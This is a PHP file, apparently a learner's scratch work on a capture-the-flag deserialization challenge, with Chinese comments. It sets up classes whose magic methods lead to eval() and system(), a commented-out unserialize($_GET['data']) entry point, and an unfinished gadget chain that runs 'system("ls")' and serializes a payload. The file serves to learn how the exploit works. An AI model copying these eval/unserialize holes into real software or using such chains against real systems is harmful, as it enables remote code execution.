<?php
class class000
{
    private $payl0ad = 1;
    protected $what="ls /";

    public function __destruct()
    {
        $this->check();
    }

    public function check()
    {
        if ($this->payl0ad === 0) {
            die('FAILED TO ATTACK');
        }
        $a = $this->what;
        $a();
    }
}

class class001
{
    public $payl0ad;
    public $a;
    public function __invoke()
    {
        $this->a->payload = $this->payl0ad;
    }
}
// __invoke() 方法在将对象当作函数来调用时被触发。
class class002
{
    private $sec='system("ls");';
    public function __set($a, $b)
    {
        $this->$b($this->sec);
    }

    public function dangerous($whaattt) //参数值是一个对象, class003
    {
        $whaattt->evvval($this->sec);
    }

}
// $whaattt = new class003();
$instance2 = new class002();
// $instance2->$sec = 'system("ls")'; // 不可, 它是私有的


$cmd = 'system("ls");';
// 比如
// $instance2->$cmd = 'evvval';

// 那么 就有执行evvval($sec)

// 所以可以设置$sec为任意值
// $sec = 'system("ls")';

class class003
{
    public $mystr;
    public function evvval($str)
    {
        eval ($str);
    }

    public function __tostring()
    {
        return $this->mystr;
    }
}

// if (isset($_GET['data'])) {
//     $a = unserialize($_GET['data']);
// } else {
//     highlight_file(__FILE__);
// }



// 1, 直接触发
$object = new class003();
$object->mystr = '$this->evvval(\'system("ls");\');'; 
echo($object); // $this->evvval('system("ls");');% 不会执行

$instance2->dangerous($object); // 这样就成了, 所以现在的问题是, 如何修改$sec的值

// $objet->evvval('system("ls");');
$serializedExploit = urlencode(serialize($object));
// echo $serializedExploit;
// $a = unserialize($serializedExploit);
// echo $serializedExploit;

// 2, 但是这样有问题, class000的check方法会直接执行, 会导致die('FAILED TO ATTACK');
?>